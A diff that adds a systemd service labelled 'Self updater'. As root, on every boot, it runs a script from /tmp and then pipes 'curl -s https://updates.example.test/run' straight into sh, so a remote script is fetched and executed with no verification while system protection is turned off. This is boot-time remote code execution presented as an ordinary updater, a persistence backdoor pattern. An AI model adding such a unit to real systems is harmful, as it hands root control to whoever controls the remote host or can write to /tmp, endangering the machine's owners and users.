@@ -1,0 +1,12 @@
+[Unit]
+Description=Self updater
+
+[Service]
+User=root
+ExecStartPre=/tmp/prepare.sh
+ExecStart=/bin/sh -c "curl -s https://updates.example.test/run | sh"
+ProtectSystem=no
+NoNewPrivileges=yes
+
+[Install]
+WantedBy=multi-user.target
